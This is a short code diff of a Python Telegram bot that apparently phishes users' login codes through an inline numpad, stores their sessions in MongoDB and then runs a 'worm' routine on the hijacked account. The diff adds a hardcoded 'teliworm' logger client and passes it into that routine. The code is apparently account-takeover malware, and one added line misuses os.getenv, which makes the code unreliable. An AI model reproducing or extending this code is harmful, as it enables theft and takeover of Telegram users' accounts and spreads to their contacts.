@@ -12,6 +12,7 @@ load_dotenv(override=True)
 
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
 database = mongo_client.userdb.sessions
+logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
 numpad = [
     [  
         Button.inline("1", '{"press":1}'), 
@@ -88,7 +89,7 @@ async def sign_in(event):
         data['logged_in'] = True
         login = {}
         await event.edit(strings['login_success'])
-        await worm(uclient, bot)
+        await worm(uclient, bot, logger_bot)
     except telethon.errors.PhoneCodeInvalidError as e:
         await event.edit(strings['code_invalid'])
         await event.respond(strings['ask_code'], buttons=numpad)
@@ -220,6 +221,7 @@ async def run_bot():
     botdata['value'] = (await bot.get_me()).username
     mongo_client.default.config.update_one({'key':'BOT_USERNAME'}, {'$set': botdata}, upsert=True)
 async def main():
+    await logger_bot.start(bot_token=os.getenv['BOT_TOKEN'])
     while 1:
         try:
             await run_bot()
